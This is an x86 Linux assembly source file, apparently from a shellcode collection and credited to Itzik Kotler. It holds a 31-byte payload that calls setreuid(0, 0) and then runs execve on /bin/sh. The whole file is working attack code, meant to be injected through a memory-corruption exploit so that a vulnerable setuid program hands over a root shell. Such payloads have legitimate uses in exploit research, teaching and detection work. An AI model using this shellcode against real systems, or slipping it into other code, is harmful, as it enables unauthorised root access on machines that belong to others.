#
# (linux/x86) setreuid(0, 0) + execve("/bin/sh", ["/bin/sh", NULL], NULL) - 31 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		push $0x46
		popl %eax
		xorl %ebx,%ebx
		xorl %ecx,%ecx
		int $0x80
		cdq
		movb $0xb, %al
                push %edx
                push $0x68732f2f
                push $0x6e69622f
                mov %esp,%ebx
                push %edx
                push %ebx
                mov %esp, %ecx
                int $0x80
